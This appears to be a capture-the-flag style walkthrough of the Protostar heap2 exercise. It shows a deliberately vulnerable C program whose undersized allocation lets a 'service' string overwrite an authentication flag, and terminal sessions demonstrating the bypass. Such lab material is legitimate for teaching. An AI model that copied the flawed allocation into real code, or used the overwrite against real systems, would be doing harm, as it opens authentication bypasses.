Now we have a very interesting challenge of heap, because we have a very stupid problem in here. Let's going to start the analysis, we can check the code in here: https://exploit-exercises.lains.space/protostar/heap2/

==================================================================
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h> 

struct auth {
  char name[32];
  int auth;
};

struct auth *auth;
char *service;

int main(int argc, char **argv)
{
  char line[128];

  while(1) {
    printf("[ auth = %p, service = %p ]\n", auth, service);

    if(fgets(line, sizeof(line), stdin) == NULL) break;
    
    if(strncmp(line, "auth ", 5) == 0) {
      auth = malloc(sizeof(auth));
      memset(auth, 0, sizeof(auth));
      if(strlen(line + 5) < 31) {
        strcpy(auth->name, line + 5);
      }
    }
    if(strncmp(line, "reset", 5) == 0) {
      free(auth);
    }
    if(strncmp(line, "service", 6) == 0) {
      service = strdup(line + 7);
    }
    if(strncmp(line, "login", 5) == 0) {
      if(auth->auth) {
        printf("you have logged in already!\n");
      } else {
        printf("please enter your password\n");
      }
    }
  }
}
==================================================================

As we can see, what we have to do, is to avoid the message of "please enter your password\n", and get the message "you have logged in already!\n". To do that we have the next commands:

* auth <name>: this will allocate memory for an auth structure, will set it to zero all the bytes, and will copy the given name into "name", but the variable auth is not modified.
* reset: will free the memory from auth.
* service <string>: will allocate a buffer for a given string and will return in service.
* login: If auth->auth is set to a value different to 0, the message "you have logged in already\n" is printed to the user, in other case "please enter your password\n" is printed.

Let's going to execute and see what happen:

	$ ./heap2
	[ auth = (nil), service = (nil) ]
	auth test
	[ auth = 0x8158818, service = (nil) ]
	service test2
	[ auth = 0x8158818, service = 0x8158828 ]
	login
	please enter your password
	[ auth = 0x8158818, service = 0x8158828 ]

As we can see, the malloc function only allocates 0x10 bytes (16) because the name of the variable it has the same name than the structure, so sizeof instead of returning the size of the structure, returns the size of the pointer 4 bytes in this case, but as a minimum it has to assign 16 bytes, after that, service command allocates a chunk on heap after the one assigned for auth, so, if we modify the memory where auth->auth should be, we can make the program print the message we want.

	$ ./heap2
	[ auth = (nil), service = (nil) ]
	auth test
	[ auth = 0x887b818, service = (nil) ]
	service aaaaaaaaaaaaaaaabcde
	[ auth = 0x887b818, service = 0x887b828 ]
	login
	you have logged in already!
	[ auth = 0x887b818, service = 0x887b828 ]

Here is a graphic representation of the problem:

   What should be

   0                                 31         35

   +---------------------------------+----------+     +--------------------------+
   |                                 |          |     |                          |
   |       Name                      |  Auth    |     |  Service                 |
   |                                 |          |     |                          |
   +---------------------------------+----------+     +--------------------------+

  0x8158818                                 0x815883c

  What it happens   (Can modify auth)

  0                  15

  +-------------------+-------------+------------+-------------+
  |                   |             |            |             |
  | Name              |    Service..|..Auth......|......       |
  |                   |             |            |             |
  +-------------------+-------------+------------+-------------+

0x8158818           0x8158828
